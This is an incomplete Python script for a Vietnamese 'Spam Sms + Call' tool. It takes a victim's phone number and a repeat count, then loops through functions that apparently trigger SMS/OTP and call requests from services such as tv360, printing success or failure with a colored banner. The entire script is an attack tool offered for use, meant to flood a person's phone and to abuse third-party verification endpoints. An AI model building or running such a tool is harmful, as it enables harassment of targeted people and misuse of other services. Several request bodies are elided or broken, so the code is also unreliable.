...
{vang}[{trang}<{xanh_la}/{trang}>{vang}] {trang_nhat}Tool Name : {vang}Spam Sms + Call V1{trang_nhat}
══════════════════════════════════════════════════════
"""
		for _ in logo:
			sys.stdout.write(_)
...
def hoanthanh(name:str, phone:str):
	timeNow = datetime.now().strftime("%H:%M:%S") 
	print(f"{vang}[{random_color()}D{random_color()}U{random_color()}C{random_color()}T{random_color()}H{random_color()}I{random_color()}N{random_color()}H{random_color()}E{random_color()}X{random_color()}E{random_color()}{vang}]{do_nhat} | {trang}[ {vang}{name.upper()}{trang} ] {do_nhat}| {xanh_ngoc}THÀNH CÔNG {do_nhat}| {nau}{timeNow} {do_nhat}| {nau}{phone} ")
def error(name, phone):
	timeNow = datetime.now().strftime("%H:%M:%S") 
	print(f"{vang}[{random_color()}D{random_color()}U{random_color()}C{random_color()}T{random_color()}H{random_color()}I{random_color()}N{random_color()}H{random_color()}E{random_color()}X{random_color()}E{random_color()}{vang}]{do_nhat} | {trang}[ {vang}{name}{trang} ] {do_nhat}| {do}THẤT BẠI {do_nhat}| {nau}{timeNow} {do_nhat}| {nau}{phone} ")
def tv360(phone):
    try:
        data = '{"msisdn":"phone"}'
...
if __name__ == "__main__":
    phone = input('\033[1;31m[\033[1;37m~.~\033[1;31m] \033[1;37m=> \033[1;32mNhập Số Điện Thoại Cần SPAM : \033[1;33m ')
    if CheckPhone(phone) == True:
        count = int(input('\033[1;31m[\033[1;37m~.~\033[1;31m] \033[1;37m=> \033[1;32mNhập Số Lần Muốn SPAM : \033[1;33m '))
        time.sleep(0.5)
    else:
        print(f'{do_nhat}SỐ ĐIỆN THOẠI SAI ĐỊNH DẠNG!')
        exit()
Banner()
for i in range(1, count + 1):
    run(phone, i)
print(f'{vang}CẢM ƠN BẠN ĐÃ SỬ DỤNG TOOL CỦA JIRAY!')
